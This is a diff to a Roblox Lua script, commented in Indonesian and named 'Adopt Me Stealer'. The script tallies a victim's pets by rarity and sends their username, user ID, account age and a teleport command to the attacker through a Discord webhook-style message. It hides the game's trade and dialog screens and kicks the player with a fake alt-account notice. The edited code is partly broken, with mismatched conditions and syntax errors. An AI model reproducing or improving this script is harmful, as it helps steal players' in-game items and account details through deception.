@@ -1,6 +1,7 @@
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
+-- Inisialisasi rarity_counts dan property_counts
 local rarity_counts = {
     legendary = 0,
     ultra_rare = 0,
@@ -8,24 +9,47 @@ local rarity_counts = {
     uncommon = 0,
     common = 0
 }
+
 local property_counts = {
     mega_neon = 0,
     neon = 0
 }
 
-for i, v in pairs(ClientData.get("inventory").pets) do
-    local petData = InventoryDB[v.category] and InventoryDB[v.category][v.id]
-    if petData then
-        -- Hitung rarity
-        if rarity_counts[petData.rarity] then
-            rarity_counts[petData.rarity] = rarity_counts[petData.rarity] + 1
-        end
+-- Iterasi untuk menghitung pets
+for i, pet in pairs(ClientData.get("inventory").pets) do
+    local rarity = InventoryDB[pet.category][pet.id].rarity
+    local property = InventoryDB[pet.category][pet.id].properties
 
-        -- Hitung properties
-        if property_counts[petData.properties] then
-            property_counts[petData.properties] = property_counts[petData.properties] + 1
-        end
+    -- Hitung berdasarkan rarity
+    if rarity == "legendary" then
+        rarity_counts.legendary = rarity_counts.legendary + 1
+    elseif rarity == "ultra_rare" then
+        rarity_counts.ultra_rare = rarity_counts.ultra_rare + 1
+    elseif rarity == "rare" then
+        rarity_counts.rare = rarity_counts.rare + 1
+    elseif rarity == "uncommon" then
+        rarity_counts.uncommon = rarity_counts.uncommon + 1
+    elseif rarity == "common" then
+        rarity_counts.common = rarity_counts.common + 1
     end
+
+    -- Hitung berdasarkan properti (Mega Neon dan Neon)
+    if property == "mega_neon" then
+        property_counts.mega_neon = property_counts.mega_neon + 1
+    elseif property == "neon" then
+        property_counts.neon = property_counts.neon + 1
+    end
+end
+
+-- Total semua pets
+local total_pets = rarity_counts.legendary + rarity_counts.ultra_rare + rarity_counts.rare +
+                   rarity_counts.uncommon + rarity_counts.common
+
+-- Jika tidak ada pets, kirim pesan kosong
+if total_pets == 2 then
+    message:reply("Victim is broke asf")
+    game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 2 pet in your inventory or use this script on your main account.")
+    return
 end
 local exploit
 local function getexploit()
@@ -55,7 +79,7 @@ local data = {
   username = 'Kenn | Adopt Me Stealer!!',
   avatar_url = 'https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&',
   content = '-- @everyone\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)',
-  embeds = {
+  embed = {
     {
       title = 'Join your player using **EXECUTE TO JOIN THEM**and they should just trade you to start stealing!',
       description = '**📄  Player Information**: \n ```lua\n🔌 Executor: '.. tostring(exploit) ..'\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. Username ..'```',
@@ -66,9 +90,13 @@ local data = {
       {name = "🦀 Uncommon", value = tostring(rarity_counts.uncommon), inline = true},
       {name = "🐈 Common", value = tostring(rarity_counts.common), inline = true},
       {name = "🐉 Mega Neon", value = tostring(property_counts.mega_neon), inline = false},
-      {name = "🦖 Neon", value = tostring(property_counts.neon), inline = false}},
+      {name = "🦖 Neon", value = tostring(property_counts.neon), inline = false},
+      {name = "🦄 Total Pets", value = tostring(total_pets), inline = false}},
       footer = {text = "📦 Inventory Summary", icon_url = "https://cdn.discordapp.com/attachments/1309897803664719954/1317140673748533320/pp_akmal.jpg?ex=675f9497&is=675e4317&hm=ab0c33daa815ab2bdbe5ec3e83fd59f14d5d86ee554411dc191e47108aeed100&"},
       timestamp = os.date('!%Y-%m-%dT%H:%M:%SZ') -- Timestamp UTC
+    }
+    message:reply {
+        embed = embed
     }
   }
 }
@@ -131,17 +159,8 @@ wait(5)
     print("No pets found in inventory.")
   end
 end
+end
 
-local total_pets = 0
-for i, v in pairs(ClientData.get("inventory").pets) do
-    total_pets = total_pets + 1
-end
-warn("Your Script Detected", total_pets, "Vulnerabilities, Bypassing Them Right Now.")
-wait(5)
-print("Bypassed!")
-    if total_pets == 1 then
-        game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
-end
 game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 
